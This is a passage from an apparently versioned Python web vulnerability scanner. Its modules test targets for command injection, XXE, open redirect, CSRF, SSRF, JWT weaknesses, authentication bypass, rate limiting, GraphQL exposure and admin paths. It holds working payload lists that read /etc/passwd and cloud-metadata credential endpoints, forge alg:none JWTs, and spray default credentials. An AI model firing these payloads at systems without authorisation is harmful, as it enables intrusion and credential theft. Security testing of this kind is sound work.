        good("No SSTI detected on tested parameters")
    _module_done("ssti")

# ═══ MODULE 16 — COMMAND INJECTION (v9.0: ${IFS}, Windows, more blind) ═
def cmdi_scan(url):
    if _module_skip("cmdi"): info("Skipping CMDi (already done)"); return
    section("MODULE 16 — COMMAND INJECTION","💻")

    # v9.0: Linux, Windows, IFS bypass, blind OOB
    CMDI_PAYLOADS = [
        # Linux basic
        ";id", "|id", "||id", "&id", "&&id",
        ";id;", "|id|", "$(id)", "`id`",
        ";cat /etc/passwd", "|cat /etc/passwd",
        "$(cat /etc/passwd)", "`cat /etc/passwd`",
        # Linux ${IFS} bypass (v9.0)
        ";${IFS}id", "|${IFS}id", "&&${IFS}id",
        ";cat${IFS}/etc/passwd", "`cat${IFS}/etc/passwd`",
        "$(cat${IFS}/etc/passwd)",
        # Encoded separators
        "%0aid", "%0a|id", "%0a;id",
        "%0a%0aid", "id%0a",
        # Windows CMDi (v9.0)
        "& dir", "| dir", "&& dir",
        "; dir", "& whoami", "| whoami",
        "&& whoami", "& ipconfig",
        "| type C:\\windows\\win.ini",
        "& type C:\\windows\\win.ini",
        # PowerShell
        "; Get-Process", "| Get-ChildItem",
        "$(Start-Process cmd)",
        # Blind OOB (v9.0 — no server needed, detect via timing)
        ";sleep 5", "|sleep 5", "&&sleep 5",
        "& timeout /t 5", "| timeout /t 5",
        ";ping -c 5 127.0.0.1", "|ping -c 5 127.0.0.1",
        # Stacked with encoding
        ";id%0a", "%7c id", "%26id%26",
        # Backtick variants
        "`sleep 5`", "$(sleep 5)",
        # Null byte separator
        "%00;id", "\x00|id",
    ]

    CMDI_CONFIRM = ["uid=","root","www-data","apache","nginx","user","bin/",
                    "volume in drive","directory of","volume serial",
                    "win.ini","\\windows\\","get-process","cmdlet"]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    cmdi_params = ["cmd","exec","command","run","ping","host","query","input",
                   "dir","path","file","name","search"]
    test_params = dict(params)
    for cp in cmdi_params:
        if cp not in test_params:
            test_params[cp] = ["127.0.0.1"]

    found_cmdi = False
    for param in list(test_params.keys())[:6]:
        for payload in CMDI_PAYLOADS:
            tp = dict(test_params)
            tp[param] = [tp[param][0] + payload]
            test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
            try:
                start = time.time()
                r = rget(test_url, timeout=TIMEOUT)
                elapsed_t = time.time() - start
                body_low = r.text.lower()
                # Confirm via output
                for sig in CMDI_CONFIRM:
                    if sig in body_low:
                        vuln(f"CMDi confirmed param='{param}' payload='{payload[:40]}' sig='{sig}'", "Critical")
                        add("cmdi", {"param": param, "payload": payload,
                            "severity": "Critical",
                            "title": f"Command Injection Confirmed [{param}]",
                            "description": f"OS command output signature '{sig}' detected. Parameter '{param}' executes system commands.",
                            "recommendation": "Never pass user input to shell functions. Use language-native APIs. Apply strict input validation and allowlisting."})
                        found_cmdi = True
                        break
                # Blind via timing
                if not found_cmdi and elapsed_t > 4.5 and ("sleep" in payload or "ping" in payload or "timeout" in payload):
                    vuln(f"Blind CMDi (time-based) param='{param}' payload='{payload[:40]}' ({elapsed_t:.1f}s)", "Critical")
                    add("cmdi", {"param": param, "payload": payload,
                        "severity": "Critical",
                        "title": f"Blind Command Injection (Time-based) [{param}]",
                        "description": f"Response delayed {elapsed_t:.1f}s with time-delay payload. Indicates blind OS command injection in parameter '{param}'.",
                        "recommendation": "Never pass user input to system/shell/exec functions. Apply strict input allowlisting."})
                    found_cmdi = True
            except Exception:
                pass
        if found_cmdi: break
    if not found_cmdi:
        good("No command injection detected on tested parameters")
    _module_done("cmdi")

# ═══ MODULE 17 — XXE INJECTION ════════════════════════════════════
def xxe_scan(url):
    if _module_skip("xxe"): info("Skipping XXE (already done)"); return
    section("MODULE 17 — XXE INJECTION","📄")
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>',
        # Billion Laughs (DoS)
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol1;</lolz>',
    ]
    XXE_CONFIRM = ["root:x:","root:0","[fonts]","[extensions]","bin/bash","bin/sh","169.254"]
    found_xxe = False
    for payload in XXE_PAYLOADS[:3]:  # skip DoS payload
        try:
            r = rpost(url, data=payload,
                      headers={"Content-Type": "application/xml"}, timeout=10)
            body_low = r.text.lower()
            for sig in XXE_CONFIRM:
                if sig in body_low:
                    vuln(f"XXE confirmed: '{sig}' in response", "High")
                    add("xxe", {"payload": payload[:100], "severity": "High",
                        "title": "XXE Injection Confirmed",
                        "description": f"External entity processed: signature '{sig}' in response.",
                        "recommendation": "Disable external entity processing. Use safe XML parsing libraries. Set FEATURE_SECURE_PROCESSING."})
                    found_xxe = True
                    break
        except Exception:
            pass
    if not found_xxe:
        good("No XXE detected on POST endpoint")
    _module_done("xxe")

# ═══ MODULE 18 — OPEN REDIRECT ═══════════════════════════════════
def open_redirect(url):
    if _module_skip("redirect"): info("Skipping open redirect (already done)"); return
    section("MODULE 18 — OPEN REDIRECT","↗")
    REDIRECT_PARAMS = ["redirect","return","url","next","goto","redir","returnUrl",
                       "redirectUrl","return_url","r","u","link","target","dest","destination"]
    REDIRECT_PAYLOADS = [
        "https://evil.com", "//evil.com", "///evil.com",
        "https:evil.com", "\\/\\/evil.com", "/\\evil.com",
        "javascript:alert(1)", "data:text/html,<script>alert(1)</script>",
        "%2F%2Fevil.com", "https%3A%2F%2Fevil.com",
    ]
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    all_params = list(params.keys()) + [p for p in REDIRECT_PARAMS if p not in params]
    found_redirect = False
    for param in all_params[:10]:
        for payload in REDIRECT_PAYLOADS[:5]:
            tp = {param: [payload]}
            test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
            try:
                r = rget(test_url, allow_redirects=False, timeout=6)
                loc = r.headers.get("Location","")
                if loc and "evil.com" in loc:
                    vuln(f"Open redirect param='{param}' → {loc}", "Medium")
                    add("redirect", {"param": param, "payload": payload, "redirect_to": loc,
                        "severity": "Medium",
                        "title": f"Open Redirect in Parameter '{param}'",
                        "description": f"Server redirects to '{loc}' when param '{param}' is set to attacker-controlled URL.",
                        "recommendation": "Validate redirect URLs against a whitelist of allowed domains. Never pass user-controlled URLs to redirect functions."})
                    found_redirect = True
            except Exception:
                pass
    if not found_redirect:
        good("No open redirect detected")
    _module_done("redirect")

# ═══ MODULE 19 — CSRF CHECK ══════════════════════════════════════
def csrf_scan(url):
    if _module_skip("csrf"): info("Skipping CSRF (already done)"); return
    section("MODULE 19 — CSRF PROTECTION CHECK","🛡")
    try:
        r = rget(url)
        body = r.text.lower()
        csrf_tokens = ["csrf","_token","xsrf","authenticity_token","csrfmiddlewaretoken",
                       "__requestverificationtoken"]
        cookie_names = [c.name.lower() for c in r.cookies]
        has_token = any(t in body for t in csrf_tokens)
        has_cookie_csrf = any("csrf" in cn or "xsrf" in cn for cn in cookie_names)
        samesite_set = any(
            "samesite" in str(r.cookies._cookies).lower() for _ in [1])
        has_csp = "content-security-policy" in {k.lower() for k in r.headers}
        if not has_token and not has_cookie_csrf:
            vuln("No CSRF token found in page forms or cookies", "Medium")
            add("csrf", {"severity": "Medium",
                "title": "Missing CSRF Protection",
                "description": "No CSRF token found in forms or cookies. POST endpoints may be vulnerable to cross-site request forgery.",
                "recommendation": "Add synchronizer token pattern (hidden CSRF token in forms). Use SameSite=Strict/Lax on session cookies. Verify Origin/Referer headers on state-changing requests."})
        else:
            good(f"CSRF token present: {'form token' if has_token else 'cookie-based'}")
    except Exception as e:
        err(f"CSRF check: {e}")
    _module_done("csrf")

# ═══ MODULE 20 — SSRF (v9.0: AWS + Azure + GCP + K8s + Oracle Cloud) ═
def ssrf_scan(url):
    if _module_skip("ssrf"): info("Skipping SSRF (already done)"); return
    section("MODULE 20 — SERVER-SIDE REQUEST FORGERY (SSRF)","🔄")

    # v9.0: All major cloud metadata endpoints
    SSRF_TARGETS = [
        # AWS IMDS v1
        ("http://169.254.169.254/latest/meta-data/", "AWS IMDS", ["ami-id","instance-id","local-hostname"]),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Role", ["role"]),
        ("http://169.254.169.254/latest/user-data", "AWS User-Data", ["#!/","userdata"]),
        # AWS IMDS v2 token
        ("http://169.254.169.254/latest/api/token", "AWS IMDSv2", ["token"]),
        # GCP metadata
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP Metadata", ["project","instance"]),
        ("http://169.254.169.254/computeMetadata/v1/instance/", "GCP Instance", ["id","zone","name"]),
        # Azure IMDS (v9.0)
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS", ["compute","subscriptionId","resourceGroupName"]),
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure MSI Token", ["access_token","token_type"]),
        # DigitalOcean
        ("http://169.254.169.254/metadata/v1/", "DigitalOcean Metadata", ["droplet","user-data"]),
        # Oracle Cloud (v9.0)
        ("http://169.254.169.254/opc/v1/instance/", "Oracle Cloud IMDS", ["compartmentId","region","shape"]),
        ("http://169.254.169.254/opc/v2/instance/", "Oracle Cloud IMDSv2", ["compartmentId"]),
        # Kubernetes API Server (v9.0)
        ("https://kubernetes.default.svc/api/", "Kubernetes API", ["apiVersion","kind"]),
        ("http://10.0.0.1/api/v1/namespaces/", "Kubernetes Namespace API", ["namespaces","kind"]),
        # Internal services
        ("http://localhost:80/", "Localhost:80", ["html","server"]),
        ("http://127.0.0.1:22/", "Localhost SSH", ["ssh","openssh"]),
        ("http://127.0.0.1:3306/", "Localhost MySQL", ["mysql"]),
        ("http://127.0.0.1:6379/", "Localhost Redis", ["redis","+PONG","-ERR"]),
        ("http://127.0.0.1:27017/", "Localhost MongoDB", ["mongodb","it looks like"]),
    ]

    SSRF_PARAMS = ["url","uri","src","source","path","load","fetch","href",
                   "redirect","return","image","img","link","file","ref",
                   "document","page","callback","host","server","target"]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    all_params = list(params.keys()) + [p for p in SSRF_PARAMS if p not in params]

    found_ssrf = False
    for param in all_params[:8]:
        for target_url, label, confirm_sigs in SSRF_TARGETS:
            tp = {param: [target_url]}
            test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
            try:
                r = rget(test_url, timeout=TIMEOUT)
                body_low = r.text.lower()[:3000]
                for sig in confirm_sigs:
                    if sig.lower() in body_low:
                        vuln(f"SSRF [{label}] via param='{param}' — sig='{sig}'", "Critical")
                        add("ssrf", {"param": param, "target": target_url, "label": label,
                            "severity": "Critical",
                            "title": f"SSRF Confirmed — {label} Accessible",
                            "description": f"Server fetched internal metadata URL '{target_url}' via parameter '{param}'. Cloud credentials and internal service data may be exposed.",
                            "recommendation": "Block requests to metadata IPs (169.254.169.254, 10.x.x.x) using firewall rules. Validate and sanitize URL parameters against an allowlist."})
                        found_ssrf = True
                        break
            except Exception:
                pass
    if not found_ssrf:
        good("No SSRF confirmed on tested parameters")
    _module_done("ssrf")

# ═══ MODULE 21 — JWT VULNERABILITIES (v9.0: 6 checks) ════════════
def jwt_scan(url):
    if _module_skip("jwt"): info("Skipping JWT (already done)"); return
    section("MODULE 21 — JWT VULNERABILITY TESTING","🔑")

    # Look for JWT in cookies, Authorization header responses
    JWT_RE = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')

    try:
        r = rget(url)
        all_text = str(r.headers) + r.text[:5000]
        tokens = JWT_RE.findall(all_text)
        # Also check cookies
        for c in r.cookies:
            tokens += JWT_RE.findall(c.value)
    except Exception as e:
        err(f"JWT scan GET: {e}"); _module_done("jwt"); return

    if not tokens:
        info("No JWT found in response headers or body")
        _module_done("jwt"); return

    good(f"Found {len(tokens)} JWT token(s)")
    for token in tokens[:3]:
        parts = token.split(".")
        if len(parts) != 3:
            continue
        try:
            # Decode header + payload (add padding)
            def _decode(s):
                pad = 4 - len(s) % 4
                return json.loads(_b64.urlsafe_b64decode(s + "=" * pad))
            hdr = _decode(parts[0])
            pay = _decode(parts[1])
            info(f"JWT Header : {json.dumps(hdr)}")
            info(f"JWT Payload: {json.dumps(pay)[:200]}")

            alg = hdr.get("alg","")

            # Check 1: alg:none attack
            none_variants = ["none","None","NONE","nOnE","NoNe"]
            for none_alg in none_variants:
                new_hdr = dict(hdr); new_hdr["alg"] = none_alg
                new_hdr_b64 = _b64.urlsafe_b64encode(json.dumps(new_hdr).encode()).rstrip(b"=").decode()
                forged = f"{new_hdr_b64}.{parts[1]}."
                # Try the forged token
                try:
                    r2 = rget(url, headers={"Authorization": f"Bearer {forged}"}, timeout=6)
                    if r2.status_code not in (401, 403):
                        vuln(f"JWT alg:none accepted (variant: {none_alg})", "Critical")
                        add("jwt", {"token_prefix": token[:30], "attack": "alg:none",
                            "severity": "Critical",
                            "title": "JWT alg:none Accepted — Signature Bypass",
                            "description": f"Server accepted a JWT with alg='{none_alg}' (no signature). Any user can forge tokens and claim any identity or role.",
                            "recommendation": "Explicitly reject tokens with alg=none. Use a JWT library that enforces algorithm allowlisting."})
                        break
                except Exception:
                    pass

            # Check 2: Weak secret brute-force (HS256)
            if alg == "HS256":
                COMMON_SECRETS = [
                    "secret","password","123456","admin","key","jwt",
                    "supersecret","mysecret","changeme","test","qwerty",
                    "jwtSecret","secretkey","your-256-bit-secret","hs256",
                ]
                for secret in COMMON_SECRETS:
                    try:
                        sign_input = f"{parts[0]}.{parts[1]}".encode()
                        expected_sig = _b64.urlsafe_b64encode(
                            hmac.new(secret.encode(), sign_input, hashlib.sha256).digest()
                        ).rstrip(b"=").decode()
                        if expected_sig == parts[2]:
                            vuln(f"JWT weak secret found: '{secret}'", "Critical")
                            add("jwt", {"token_prefix": token[:30], "attack": "weak_secret",
                                "secret": secret, "severity": "Critical",
                                "title": f"JWT Signed With Weak Secret: '{secret}'",
                                "description": f"The JWT is signed with a guessable secret '{secret}'. An attacker can forge any token with any claims.",
                                "recommendation": "Use a cryptographically random secret of at least 256 bits. Use asymmetric RS256/ES256 for production."})
                            break
                    except Exception:
                        pass

            # Check 3: RS256 → HS256 algorithm confusion (v9.0)
            if alg == "RS256":
                vuln(f"JWT uses RS256 — test algorithm confusion attack (RS256→HS256)", "Medium")
                add("jwt", {"token_prefix": token[:30], "attack": "alg_confusion",
                    "severity": "Medium",
                    "title": "JWT RS256 → HS256 Algorithm Confusion Risk",
                    "description": "JWT uses RS256 (asymmetric). If the server accepts HS256 tokens signed with the public key as the secret, an attacker who knows the public key can forge tokens.",
                    "recommendation": "Explicitly configure JWT library to only accept RS256. Reject HS256 tokens on RSA-keyed endpoints."})

            # Check 4: kid header injection (v9.0)
            if "kid" in hdr:
                kid_val = hdr["kid"]
                sql_kid = "' OR '1'='1"
                path_kid = "../../../dev/null"
                for bad_kid in [sql_kid, path_kid]:
                    new_hdr2 = dict(hdr); new_hdr2["kid"] = bad_kid
                    new_hdr2_b64 = _b64.urlsafe_b64encode(json.dumps(new_hdr2).encode()).rstrip(b"=").decode()
                    forged2 = f"{new_hdr2_b64}.{parts[1]}.{parts[2]}"
                    try:
                        r3 = rget(url, headers={"Authorization": f"Bearer {forged2}"}, timeout=6)
                        if r3.status_code not in (401, 403):
                            vuln(f"JWT kid header injection accepted: kid='{bad_kid[:30]}'", "High")
                            add("jwt", {"token_prefix": token[:30], "attack": "kid_injection",
                                "kid_payload": bad_kid, "severity": "High",
                                "title": "JWT kid Header Injection",
                                "description": f"Server accepted JWT with malicious kid header value '{bad_kid}'. kid is used to look up signing keys — SQLi or path traversal in kid can allow key manipulation.",
                                "recommendation": "Validate and sanitize the kid header value. Use a predefined key store. Never use kid values in SQL queries or file paths."})
                            break
                    except Exception:
                        pass

            # Check 5: jku/x5u header injection (v9.0)
            for jku_hdr in ("jku", "x5u"):
                if jku_hdr in hdr:
                    jku_val = hdr[jku_hdr]
                    warn(f"JWT contains {jku_hdr}='{jku_val}' — remote JWKS URL. Verify server validates this URL.")
                    add("jwt", {"token_prefix": token[:30], "attack": f"{jku_hdr}_injection",
                        "severity": "High",
                        "title": f"JWT {jku_hdr.upper()} Header Present — Remote Key URL",
                        "description": f"JWT header contains {jku_hdr}='{jku_val}'. If the server fetches keys from this URL without validation, an attacker can host a JWKS with their own key.",
                        "recommendation": f"Reject JWTs with {jku_hdr} headers unless the URL is in a strict allowlist. Pin the JWKS URL server-side."})

            # Check 6: Expiry check
            exp = pay.get("exp")
            if exp:
                exp_dt = datetime.datetime.utcfromtimestamp(exp)
                now = datetime.datetime.utcnow()
                if exp_dt < now:
                    warn(f"JWT token is expired (exp: {exp_dt.isoformat()})")
                    add("jwt", {"token_prefix": token[:30], "attack": "expired_accepted",
                        "severity": "Medium",
                        "title": "Expired JWT Token — Check If Server Rejects",
                        "description": f"JWT expired at {exp_dt.isoformat()}. Test if server still accepts expired tokens.",
                        "recommendation": "Server must validate the exp claim on every request. Never accept expired tokens."})
                else:
                    info(f"JWT expiry: {exp_dt.isoformat()} (valid)")
            else:
                vuln("JWT has no expiry (exp) claim", "Medium")
                add("jwt", {"token_prefix": token[:30], "attack": "no_expiry",
                    "severity": "Medium",
                    "title": "JWT Has No Expiry Claim",
                    "description": "No exp claim in JWT. Tokens never expire — a stolen token is valid forever.",
                    "recommendation": "Always set exp claim. Implement token rotation and revocation mechanisms."})

        except Exception as ex:
            err(f"JWT decode: {ex}")
    _module_done("jwt")

# ═══ MODULE 22 — AUTH BYPASS (v9.0: 50+ creds + SQL truncation + Unicode) ═
def authn_bypass(url):
    if _module_skip("authn_bypass"): info("Skipping auth bypass (already done)"); return
    section("MODULE 22 — AUTHENTICATION BYPASS","🔓")

    # v9.0: 50+ default credential pairs
    DEFAULT_CREDS = [
        # Generic
        ("admin","admin"), ("admin","password"), ("admin","1234"), ("admin","12345"),
        ("admin","123456"), ("admin","admin123"), ("admin","pass"), ("admin",""),
        ("administrator","administrator"), ("administrator","admin"), ("administrator","password"),
        ("root","root"), ("root","toor"), ("root","password"), ("root","admin"), ("root",""),
        ("user","user"), ("user","password"), ("user","1234"), ("guest","guest"),
        ("guest","password"), ("test","test"), ("test","password"), ("demo","demo"),
        # Web applications
        ("admin","changeme"), ("admin","letmein"), ("admin","secret"),
        ("admin","admin@123"), ("admin","P@ssw0rd"), ("admin","Admin@123"),
        # Databases
        ("sa","sa"), ("sa","password"), ("sa",""), ("sa","admin"),    # MSSQL
        ("postgres","postgres"), ("postgres","password"), ("postgres",""),  # PostgreSQL
        ("mysql","mysql"), ("dbadmin","dbadmin"),
        # Network devices
        ("cisco","cisco"), ("cisco","admin"), ("enable","enable"),
        ("manager","manager"), ("operator","operator"),
        # CMS
        ("admin","wordpress"), ("admin","joomla"), ("admin","drupal"),
        ("wp-admin","wp-admin"), ("webmaster","webmaster"),
        # IoT / Embedded
        ("pi","raspberry"), ("ubnt","ubnt"), ("admin","1111"), ("admin","0000"),
        ("admin","888888"), ("666666","666666"), ("support","support"),
    ]

    # v9.0: SQL truncation bypass payloads
    SQL_TRUNCATION = [
        ("admin               x", "anything"),  # trailing spaces
        ("admin\x00", "anything"),              # null byte truncation
        ("admin%00", "anything"),
    ]

    # v9.0: Unicode normalization bypass
    UNICODE_BYPASS = [
        ("ａｄｍｉｎ", "admin"),          # fullwidth chars
        ("ADMIN", "admin"),                # case insensitivity
        ("Admin", "admin"),
        ("\u0041\u0064\u006d\u0069\u006e", "admin"),  # Unicode escapes → "Admin"
    ]

    LOGIN_PATHS = ["/login", "/admin/login", "/wp-login.php", "/administrator/",
                   "/admin/", "/panel/login", "/user/login", "/auth/login",
                   "/signin", "/account/login", "/portal/login"]
    LOGIN_FIELDS = [
        ("username","password"), ("user","pass"), ("email","password"),
        ("login","password"), ("uname","passwd"), ("usr","pwd"),
        ("username","passwd"), ("user_name","password"),
    ]

    base = url.rstrip("/")
    # Detect login form
    login_url = None
    for path in LOGIN_PATHS:
        try:
            r = rget(base + path, timeout=6)
            if r.status_code == 200 and any(x in r.text.lower() for x in
                ["password","login","signin","username","email"]):
                login_url = base + path
                break
        except Exception:
            pass
    if not login_url:
        login_url = url

    info(f"Testing {len(DEFAULT_CREDS)} credential pairs + truncation/unicode bypass at {login_url}")
    found_bypass = False

    # Try default credentials
    for user, passwd in DEFAULT_CREDS:
        for uf, pf in LOGIN_FIELDS[:3]:
            try:
                r = rpost(login_url, data={uf: user, pf: passwd}, timeout=TIMEOUT,
                          allow_redirects=True)
                body_low = r.text.lower()
                if r.status_code in (200, 302) and any(x in body_low for x in
                    ["logout","dashboard","welcome","profile","admin","success","panel"]):
                    if not any(x in body_low for x in
                        ["invalid","wrong","failed","incorrect","error","try again"]):
                        vuln(f"Default credentials work: {user}:{passwd}", "Critical")
                        add("authn_bypass", {"username": user, "password": passwd,
                            "url": login_url, "severity": "Critical",
                            "title": f"Default Credentials Work: {user}:{passwd}",
                            "description": f"Login succeeded with default credentials {user}:{passwd} at {login_url}.",
                            "recommendation": "Change all default credentials immediately. Implement account lockout after 5 failed attempts. Use strong password policies."})
                        found_bypass = True
                        break
            except Exception:
                pass
        if found_bypass: break

    # v9.0: SQL truncation bypass
    if not found_bypass:
        for user, passwd in SQL_TRUNCATION:
            for uf, pf in LOGIN_FIELDS[:2]:
                try:
                    r = rpost(login_url, data={uf: user, pf: passwd}, timeout=TIMEOUT,
                              allow_redirects=True)
                    body_low = r.text.lower()
                    if any(x in body_low for x in ["logout","dashboard","welcome"]):
                        if not any(x in body_low for x in ["invalid","failed","error"]):
                            vuln(f"Auth bypass via SQL truncation: user='{user[:20]}'", "Critical")
                            add("authn_bypass", {"username": user, "password": passwd,
                                "url": login_url, "severity": "Critical",
                                "title": "Authentication Bypass via SQL Truncation",
                                "description": f"Login succeeded with SQL truncation payload. Username '{user[:30]}' was truncated to 'admin'.",
                                "recommendation": "Use parameterized queries. Validate username length before database operations."})
                            found_bypass = True
                            break
                except Exception:
                    pass
            if found_bypass: break

    if not found_bypass:
        good("No authentication bypass detected")
    _module_done("authn_bypass")

# ═══ MODULE 23 — RATE LIMITING ═══════════════════════════════════
def rate_limit_check(url):
    if _module_skip("ratelimit"): info("Skipping rate limit (already done)"); return
    section("MODULE 23 — RATE LIMITING CHECK","⏱")
    LOGIN_PATH = None
    LOGIN_PATHS = ["/login","/admin/login","/wp-login.php","/signin","/api/login","/auth"]
    base = url.rstrip("/")
    for path in LOGIN_PATHS:
        try:
            r = rget(base + path, timeout=6)
            if r.status_code in (200, 405):
                LOGIN_PATH = base + path; break
        except Exception:
            pass
    if not LOGIN_PATH:
        LOGIN_PATH = url

    info(f"Sending 20 rapid login requests to {LOGIN_PATH}")
    blocked = False
    for i in range(20):
        try:
            r = rpost(LOGIN_PATH,
                      data={"username": f"user{i}", "password": "wrongpassword"},
                      timeout=5)
            if r.status_code in (429, 503):
                blocked = True
                good(f"Rate limiting detected at request {i+1} (HTTP {r.status_code})")
                add("ratelimit", {"severity": "Info",
                    "title": "Rate Limiting Detected",
                    "description": f"Server returned HTTP {r.status_code} after {i+1} rapid requests.",
                    "recommendation": "Rate limiting is working. Ensure it also covers authenticated endpoints and password reset flows."})
                break
            if "blocked" in r.text.lower() or "captcha" in r.text.lower():
                blocked = True
                good(f"CAPTCHA/block detected at request {i+1}")
                break
        except Exception:
            break
    if not blocked:
        vuln("No rate limiting detected — brute-force attack possible", "High")
        add("ratelimit", {"severity": "High",
            "title": "No Rate Limiting on Login Endpoint",
            "description": "20 rapid login requests were sent without triggering any rate limit or block. An attacker can run unlimited brute-force attempts.",
            "recommendation": "Implement rate limiting (max 5 attempts per 15 minutes per IP). Add CAPTCHA after 3 failures. Implement account lockout. Use Fail2Ban or similar."})
    _module_done("ratelimit")

# ═══ MODULE 24 — GRAPHQL (v9.0: introspection bypass + field suggestion + alias batching) ═
def graphql_scan(url):
    if _module_skip("graphql"): info("Skipping GraphQL (already done)"); return
    section("MODULE 24 — GRAPHQL SECURITY TESTING","📡")
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    GQL_ENDPOINTS = ["/graphql", "/api/graphql", "/graphql/v1", "/gql",
                     "/query", "/api/query", "/graphiql", "/playground"]

    gql_url = None
    for ep in GQL_ENDPOINTS:
        try:
            test = base + ep
            r = rpost(test, json={"query": "{__typename}"}, timeout=6)
            if r.status_code == 200 and ("data" in r.text or "typename" in r.text.lower()):
                gql_url = test
                good(f"GraphQL endpoint found: {gql_url}")
                break
        except Exception:
            pass

    if not gql_url:
        info("No GraphQL endpoint found")
        _module_done("graphql"); return

    # Test 1: Introspection enabled
    introspection_query = {"query": "{ __schema { queryType { name } } }"}
    try:
        r = rpost(gql_url, json=introspection_query, timeout=TIMEOUT)
        if "queryType" in r.text or "__schema" in r.text:
            vuln("GraphQL introspection is enabled — full schema exposed", "Medium")
            add("graphql", {"test": "introspection", "severity": "Medium",
                "title": "GraphQL Introspection Enabled",
                "description": "Full API schema is publicly accessible via introspection. Attackers can enumerate all types, queries, mutations, and fields.",
                "recommendation": "Disable introspection in production. Use query depth/complexity limits."})
    except Exception:
        pass

    # Test 2: Introspection bypass (v9.0)
    bypass_queries = [
        {"query": "{__schema{types{name}}}"},
        {"query": "query IntrospectionQuery { __schema { types { name } } }"},
        # Fragment bypass
        {"query": "fragment f on __Schema { queryType { name } } { ...f }"},
    ]
    for bq in bypass_queries:
        try:
            r = rpost(gql_url, json=bq, timeout=TIMEOUT)
            if ("types" in r.text or "__Schema" in r.text) and "errors" not in r.text.lower():
                vuln(f"GraphQL introspection bypass succeeded", "Medium")
                add("graphql", {"test": "introspection_bypass", "severity": "Medium",
                    "title": "GraphQL Introspection Bypass",
                    "description": "Introspection filtering was bypassed using an alternate query structure.",
                    "recommendation": "Block introspection at the resolver level, not just at the query name level."})
                break
        except Exception:
            pass

    # Test 3: Field suggestion attack (v9.0)
    suggestion_query = {"query": "{ _dummy_nonexistent_field }"}
    try:
        r = rpost(gql_url, json=suggestion_query, timeout=TIMEOUT)
        if "did you mean" in r.text.lower() or "suggestions" in r.text.lower():
            vuln("GraphQL field suggestion enabled — schema enumeration via typos", "Low")
            add("graphql", {"test": "field_suggestion", "severity": "Low",
                "title": "GraphQL Field Suggestion Enabled",
                "description": "Server suggests field names for typos. Attackers can enumerate fields by making intentional typos and reading suggestions.",
                "recommendation": "Disable field suggestions in production or return generic error messages."})
    except Exception:
        pass

    # Test 4: Alias batching / query flooding (v9.0)
    batch_query = {"query": " ".join([f"q{i}: __typename" for i in range(50)])}
    try:
        r = rpost(gql_url, json=batch_query, timeout=15)
        if r.status_code == 200 and "typename" in r.text.lower():
            vuln(f"GraphQL alias batching allowed — {50} aliases in one query", "Medium")
            add("graphql", {"test": "alias_batching", "severity": "Medium",
                "title": "GraphQL Alias Batching — Potential DoS / Brute-force Amplification",
                "description": "Server processed 50 aliases in a single query. Alias batching enables brute-force rate-limit bypass and query complexity amplification attacks.",
                "recommendation": "Implement query complexity limits and alias count restrictions. Use rate limiting per query, not per request."})
    except Exception:
        pass

    # Test 5: Mutation testing
    test_mutation = {"query": "mutation { createUser(input: {username:\"test\", password:\"test\"}) { id } }"}
    try:
        r = rpost(gql_url, json=test_mutation, timeout=TIMEOUT)
        if r.status_code == 200 and "errors" not in r.text.lower():
            warn(f"GraphQL mutation endpoint reachable — test manually for IDOR/auth bypass")
            add("graphql", {"test": "mutation_accessible", "severity": "Low",
                "title": "GraphQL Mutation Endpoint Accessible",
                "description": "Mutations are reachable without obvious authentication errors. Test manually for IDOR, privilege escalation, and mass assignment.",
                "recommendation": "Ensure all mutations require authentication. Apply authorization checks at the resolver level."})
    except Exception:
        pass

    _module_done("graphql")

# ═══ MODULE 25 — PRIVILEGE ESCALATION ════════════════════════════
def privesc_scan(url):
    if _module_skip("privesc"): info("Skipping privesc (already done)"); return
    section("MODULE 25 — PRIVILEGE ESCALATION PATHS","⚡")
    base = url.rstrip("/")
    ADMIN_PATHS = [
        "/admin","/admin/","/admin/users","/admin/config","/admin/settings",
        "/admin/dashboard","/admin/panel","/admin/db","/admin/sql",
        "/admin/logs","/admin/backup","/wp-admin","/wp-admin/users.php",
        "/administrator","/cpanel","/whm","/plesk","/webmin",
        "/phpmyadmin","/pma","/mysql","/adminer",
        "/jenkins","/sonar","/grafana","/kibana","/consul",
        "/api/v1/admin","/api/admin","/api/users","/api/config",
        "/debug","/trace","/env","/info","/status",
        "/_debug","/flask-debug","/django-admin",
        "/actuator","/actuator/env","/actuator/mappings",
        "/swagger-ui","/swagger-ui.html","/swagger-ui/index.html",
        "/api-docs","/redoc","/docs",
    ]
    found_count = 0
    for path in ADMIN_PATHS:
        try:
            r = rget(base + path, allow_redirects=False, timeout=6)
            if r.status_code in (200, 302, 403):
                sev = "Critical" if r.status_code == 200 else "High" if r.status_code == 403 else "Medium"
                note = f"[{r.status_code}] {path}"
                vuln(note, sev)
                add("privesc", {"path": path, "status": r.status_code, "severity": sev,
                    "title": f"Admin Path Accessible: {path} [{r.status_code}]",
                    "description": f"HTTP {r.status_code} at {base+path}. Admin/debug interface may be accessible.",
